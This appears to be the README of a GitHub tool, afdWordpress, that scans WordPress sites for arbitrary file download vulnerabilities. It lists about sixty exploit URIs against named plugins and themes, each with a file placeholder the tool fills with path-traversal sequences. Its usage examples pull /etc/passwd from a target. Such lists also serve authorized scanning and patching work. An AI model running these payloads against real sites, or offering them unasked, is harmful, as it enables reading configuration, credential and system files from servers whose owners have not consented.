# Wordpress A.F.D. Verification
[![Version](https://img.shields.io/badge/afdWordpress-0.1-brightgreen.svg?maxAge=259200)]()
[![Python 3.7](https://img.shields.io/badge/Python-3.7-yellow.svg)](https://www.python.org/)
[![Build](https://img.shields.io/badge/Supported_OS-Linux-orange.svg)]()
[![Build](https://img.shields.io/badge/Supported_OS-Mac-orange.svg)]()
![GitHub](https://img.shields.io/github/license/MrCl0wnLab/afdWordpress?color=blue)

## Check arbitrary file download vulnerability in the WordPress

```
 + Autor: MrCl0wn
 + Blog: http://blog.mrcl0wn.com
 + GitHub: https://github.com/MrCl0wnLab
 + Twitter: https://twitter.com/MrCl0wnLab
 + Email: mrcl0wnlab\@\gmail.com
```
## WARNING
```
+------------------------------------------------------------------------------+
|  [!] Legal disclaimer: Usage of afdWordpress for attacking                   |
|  targets without prior mutual consent is illegal.                            |
|  It is the end user's responsibility to obey all applicable                  | 
|  local, state and federal laws.                                              |
|  Developers assume no liability and are not responsible for any misuse or    |
|  damage caused by this program                                               |
+------------------------------------------------------------------------------+
```
![GitHub](https://i.imgur.com/M7OFyVb.png)

### DESCRIPTION
```
This tool aims to facilitate checking arbitrary file download vulnerability
```
### REQUIREMENTS
```
threading
argparse
csv
collections
random
urllib
```
### INSTALL
```
$ git clone https://github.com/MrCl0wnLab/afdWordpress
$ cd afdWordpress
$ pip3.7 install -r requirements.txt
```
### HELP
```
$ git clone https://github.com/MrCl0wnLab/afdWordpress
$ cd afdWordpress
$ python3.7 afd.py --help


        ▄████████    ▄████████ ████████▄  
        ███    ███   ███    ███ ███   ▀███ 
        ███    ███   ███    █▀  ███    ███ 
        ███    ███  ▄███▄▄▄     ███    ███ 
      ▀███████████ ▀▀███▀▀▀     ███    ███ 
        ███    ███   ███        ███    ███ 
        ███    ███   ███        ███   ▄███ 
        ███    █▀    ███        ████████▀ 
        Arbitrary File Download-[ Verifier ]
        By MrCl0wn
        
usage: tool [-h] --url http://url [--file /file.php] [--threads 10]

optional arguments:
  -h, --help        show this help message and exit
  --url http://url  URL to request Ex: http://www.host.com
  --file /file.php  File to fuzzing Ex: /wp-admin.php
  --threads 10      Threads
```

### USE
```
$ python3.7 afd.py --url https://blog.mrcl0wn.com 
$ python3.7 afd.py --url https://blog.mrcl0wn.com --thread 50
$ python3.7 afd.py --url https://blog.mrcl0wn.com --thread 50 --file /etc/passwd
```
### SOURCE VERIFICATION
> File: inject.csv

|exploit_uri|pwd_count                    |ref   |
|-----------|-----------------------------|------|
|/?action=cpis_init&cpis-action=f-download&purchase_id=1&cpis_user_email=i0SECLAB@intermal.com&f=_PWD__FILE_|4                            |      |
|/?mdocs-img-preview=_PWD__FILE_|3                            |      |
|/mdocs-posts/?mdocs-img-preview=_PWD__FILE_|3                            |      |
|/wp-admin/admin-ajax.php?action=kbslider_show_image&img=_PWD__FILE_|1                            |      |
|/wp-admin/admin-ajax.php?action=revslider_show_image&img=_PWD__FILE_|0                            |      |
|/wp-admin/admin-ajax.php?action=revslider_show_image&img=_PWD__FILE_|1                            |      |
|/wp-admin/admin.php?page=miwoftp&option=com_miwoftp&action=download&dir=/&item=_PWD__FILE_&order=name&srt=yes|0                            |      |
|/wp-admin/edit.php?post_type=wd_ads_ads&export=export_csv&path=_PWD__FILE_|1                            |      |
|/wp-admin/tools.php?content=&wp-attachment-export-download=true|0                            |https://packetstormsecurity.com/files/132693/WordPress-WP-Attachment-Export-0.2.3-Arbitrary-File-Download.html|
|/wp-admin/tools.php?content=attachment&wp-attachment-export-download=true|0                            |https://packetstormsecurity.com/files/132693/WordPress-WP-Attachment-Export-0.2.3-Arbitrary-File-Download.html|
|/wp-content/force-download.php?file=_PWD__FILE_|0                            |      |
|/wp-content/plugins/./simple-image-manipulator/controller/download.php?filepath=_PWD__FILE_|0                            |      |
|/wp-content/plugins//asgallDownload.php?imgname=_PWD__FILE_|3                            |      |
|/wp-content/plugins/ajax-store-locator-wordpress_0/sl_file_download.php?download_file=_PWD__FILE_|3                            |      |
|/wp-content/plugins/allow-l10n-upload-filename/download.php?id=_PWD__FILE_|3                            |      |
|/wp-content/plugins/aspose-cloud-ebook-generator/aspose_posts_exporter_download.php?file=_PWD__FILE_|3                            |      |
|/wp-content/plugins/aspose-doc-exporter/aspose_doc_exporter_download.php?file=_PWD__FILE_|2                            |      |
|/wp-content/plugins/aspose-importer-exporter/aspose_import_export_download?file=_PWD__FILE_|3                            |      |
|/wp-content/plugins/candidate-application-form/downloadpdffile.php?fileName=_PWD__FILE_|10                           |      |
|/wp-content/plugins/count-per-day/download.php?n=1&f=_PWD__FILE_|0                            |      |
|/wp-content/plugins/document_manager/views/file_download.php?fname=_PWD__FILE_|2                            |      |
|/wp-content/plugins/hb-audio-gallery-lite/gallery/audio-download.php?file_path=_PWD__FILE_&file_size=10|4                            |      |
|/wp-content/plugins/history-collection/download.php?var=_PWD__FILE_|3                            |      |
|/wp-content/plugins/hwm_board/download.php?filename=_PWD__FILE_|0                            |      |
|/wp-content/plugins/hwm_board/download.php?filename=_PWD__FILE_&fileNa=_PWD__FILE_|0                            |      |
|/wp-content/plugins/image-export/download.php?file=_PWD__FILE_|0                            |      |
|/wp-content/plugins/justified-image-grid/download.php?file=file:///C:/wamp/www/_PWD__FILE_|0                            |      |
|/wp-content/plugins/justified-image-grid/download.php?file=file:///C:/xampp/htdocs/_PWD__FILE_|0                            |      |
|/wp-content/plugins/justified-image-grid/download.php?file=file:///var/www/_PWD__FILE_|0                            |      |
|/wp-content/plugins/mdc-youtube-downloader/includes/download.php?file=_PWD__FILE_|0                            |      |
|/wp-content/plugins/membership-simplified-for-oap-members-only/download.php?download_file=_PWD__FILE_|6                            |      |
|/wp-content/plugins/recent-backups/download-file.php?file_link=_PWD__FILE_|0                            |      |
|/wp-content/plugins/s3bubble-amazon-s3-html-5-video-with-adverts/assets/plugins/ultimate/content/downloader.php?name=_PWD__FILE_&path=_PWD__FILE_|7                            |      |
|/wp-content/plugins/s3bubble-amazon-s3-html-5-video-with-adverts/assets/plugins/ultimate/content/downloader.php?path=_PWD__FILE_|7                            |      |
|/wp-content/plugins/sermon-shortcodes/download.php?file=_PWD__FILE_|0                            |https://packet..com/files/150507/...bitrary-File-Download.html|
|/wp-content/plugins/uploadingdownloading-non-latin-filename/download.php?id=_PWD__FILE_|0                            |https://cxsecurity.com/issue/WLB-2018110241|
|/wp-content/plugins/Wordpress/Aaspose-pdf-exporter/aspose_pdf_exporter_download.php?file=_PWD__FILE_|3                            |https://dl.packe...503-exploits/wpaspose-disclose.txt|
|/wp-content/plugins/wp-ecommerce-shop-styling/includes/download.php?filename=_PWD__FILE_|9                            |https://www.exploit-db.com/exploits/37530|
|/wp-content/plugins/wp-filemanager/incl/libfile.php?&path=_PWD_&filename=_FILE_&action=download|2                            |https://wp.com/vulnerabilities/6499|
|/wp-content/plugins/wp-mon/assets/download.php?type=octet/stream&path=_PWD__FILE_&name=_PWD__FILE_|0                            |      |
|/wp-content/plugins/wp-swimteam/include/user/download.php?file=_PWD__FILE_&filename=_PWD__FILE_&contenttype=text/html&transient=1&abspath=/usr/share/wordpress|0                            |https://www.exploit-db.com/exploits/37601|
|/wp-content/plugins/wptf-image-gallery/lib-mbox/ajax_load.php?url=_PWD__FILE_|0                            |      |
|/wp-content/themes/acento/includes/view-pdf.php?download=1&file=/path/_PWD__FILE_|0                            |      |
|/wp-content/themes/antioch/lib/scripts/download.php?file=_PWD__FILE_|5                            |      |
|/wp-content/themes/authentic/includes/download.php?file=_PWD__FILE_|4                            |      |
|/wp-content/themes/churchope/lib/downloadlink.php?file=_PWD__FILE_|4                            |      |
|/wp-content/themes/epic/includes/download.php?file=_PWD__FILE_|0                            |      |
|/wp-content/themes/erinvale/download.php?file=_PWD__FILE_|3                            |https://dl.pac.../1808-exploits/wpdreamsmiths-disclose.txt|
|/wp-content/themes/felis/download.php?file=_PWD__FILE_|0                            |      |
|/wp-content/themes/fiestaresidences/download.php?file=_PWD__FILE_|3                            |https://dl.packe.../1808-exploits/wpdreamsmiths-disclose.txt|
|/wp-content/themes/hsv/download.php?file=_PWD__FILE_|3                            |https://dl.packet.../1808-exploits/wpdreamsmiths-disclose.txt|
|/wp-content/themes/linenity/functions/download.php?imgurl=_PWD__FILE_|4                            |      |
|/wp-content/themes/lote27/download.php?download=_PWD__FILE_|3                            |      |
|/wp-content/themes/markant/download.php?file=_PWD__FILE_|2                            |      |
|/wp-content/themes/MichaelCanthony/download.php?file=_PWD__FILE_|3                            |      |
|/wp-content/themes/mTheme-Unus/css/css.php?files=_PWD__FILE_|4                            |      |
|/wp-content/themes/NativeChurch/download/download.php?file=_PWD__FILE_|4                            |      |
|/wp-content/themes/optimus/download.php?file=_PWD__FILE_|3                            |https://dl.pac.../1808-exploits/wpdreamsmiths-disclose.txt|
|/wp-content/themes/SMWF/inc/download.php?file=_PWD__FILE_|0                            |      |
|/wp-content/themes/TheLoft/download.php?file=|3                            |      |
|/wp-content/themes/trinity/lib/scripts/download.php?file=_PWD__FILE_|5                            |      |
|/wp-content/themes/urbancity/lib/scripts/download.php?file=_PWD__FILE_|5                            |      |
|/wp-content/themes/yakimabait/download.php?file=_PWD__FILE_|0                            |      |

### DESCRIPTION FILE
|exploit_uri|pwd_count                    |ref   |
|-----------|-----------------------------|------|
|url_exploit_get| count_mount_pwd             | ref_exploit|

> exploit_uri: Request get for exploration and concatenation with target_url.

> pwd_count: Count pwd for concatenation loop.

> ref: This column is referential document.
### OUTPUT RESULT
> ok-file.log

> error-file.log
